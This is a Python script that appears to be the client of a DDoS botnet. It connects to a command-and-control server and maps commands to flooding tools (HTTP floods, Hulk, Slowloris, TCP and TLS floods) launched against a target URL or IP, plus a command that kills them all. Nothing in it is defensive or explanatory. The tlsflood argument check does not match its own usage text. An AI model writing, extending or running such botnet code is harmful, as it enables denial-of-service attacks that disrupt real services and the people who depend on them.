import socket
import subprocess
import os
from datetime import datetime

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1111

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_HOST, SERVER_PORT))

print(f"⚡ Connected to C2 Server at {SERVER_HOST}:{SERVER_PORT}")

def format_duration(seconds):
    mins, secs = divmod(seconds, 60)
    return f"{mins:02d}m {secs:02d}s"

def execute_command(cmd):
    start_time = datetime.now()
    try:
        parts = cmd.split()

        if cmd.startswith("http-raw"):
            if len(parts) < 3:
                print("❌ Usage: http-raw <url> <time>")
                return
            print(f"🚀 Starting HTTP-RAW attack on {parts[1]}")
            subprocess.Popen(["node", "HTTP-RAW", parts[1], parts[2]])

        elif cmd.startswith("crash"):
            if len(parts) < 3:
                print("❌ Usage: crash <url> <GET/POST>")
                return
            print(f"💥 Starting Crash attack on {parts[1]}")
            subprocess.Popen(["go", "run", "Hulk.go", "-site", parts[1], "-data", parts[2]])

        elif cmd.startswith("httpflood"):
            if len(parts) < 5:
                print("❌ Usage: httpflood <url> <threads> <GET/POST> <time>")
                return
            print(f"🌊 Starting HTTPFlood with {parts[2]} threads")
            subprocess.Popen(["go", "run", "httpflood.go", parts[1], parts[2], parts[3], parts[4], "nil"])

        elif cmd.startswith("stdv2"):
            if len(parts) < 3:
                print("❌ Usage: stdv2 <ip> <port>")
                return
            print(f"🔫 Launching STDv2 on {parts[1]}:{parts[2]}")
            subprocess.Popen(["./std", parts[1], parts[2]])

        elif cmd.startswith("slowloris"):
            if len(parts) < 3:
                print("❌ Usage: slowloris <ip> <port>")
                return
            print(f"🐌 Launching Slowloris on {parts[1]}:{parts[2]}")
            subprocess.Popen(["./slowloris", parts[1], parts[2]])

        elif cmd.startswith("tcp"):
            if len(parts) < 6:
                print("❌ Usage: tcp <method> <ip> <port> <time> <connections>")
                return
            print(f"📡 Launching TCP Flood {parts[1]} on {parts[2]}:{parts[3]} with {parts[5]} connections")
            subprocess.Popen(["./100UP-TCP", parts[1], parts[2], parts[3], parts[4], parts[5]])

        elif cmd.startswith("tlsflood"):
            if len(parts) < 5:  # matches the placeholder params `- - 60`
                print("❌ Usage: tlsflood <url> <time>")
                return
            print(f"🔐 Starting TLS Flood on {parts[1]} for {parts[4]}s")
            subprocess.Popen(["node", "tls.js", parts[1], parts[4]])

        elif cmd.startswith("stop"):
            print("🛑 Stopping all attacks")
            os.system("pkill -f HTTP-RAW")
            os.system("pkill -f Hulk.go")
            os.system("pkill -f httpflood.go")
            os.system("pkill -f std")
            os.system("pkill -f slowloris")
            os.system("pkill -f 100UP-TCP")
            os.system("pkill -f tls.js")

        duration = (datetime.now() - start_time).total_seconds()
        print(f"✅ Command executed in {format_duration(int(duration))}")

    except Exception as e:
        print(f"❌ Error: {e}")